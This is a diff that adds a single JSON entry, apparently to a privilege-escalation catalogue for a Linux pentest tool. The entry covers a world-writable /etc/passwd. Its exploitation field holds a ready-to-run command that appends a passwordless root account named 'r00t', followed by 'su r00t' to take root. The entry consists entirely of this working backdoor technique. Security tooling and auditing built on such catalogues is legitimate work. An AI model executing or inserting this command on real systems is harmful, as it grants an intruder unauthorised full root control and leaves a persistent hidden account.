@@ -1,0 +1,1 @@
+{"id":"writable_etc_passwd","category":"OTHER","binary":"/etc/passwd","cve":"WRT-PASSWD","exploitation":["echo 'r00t::0:0:root:/root:{{shell}}' >> /etc/passwd","su r00t"],"post_exploit":["id"],"notes":"Adds a passwordless root user. Requires world-writable /etc/passwd.","source":"generic","tags":["passwd"],"severity":"critical"}
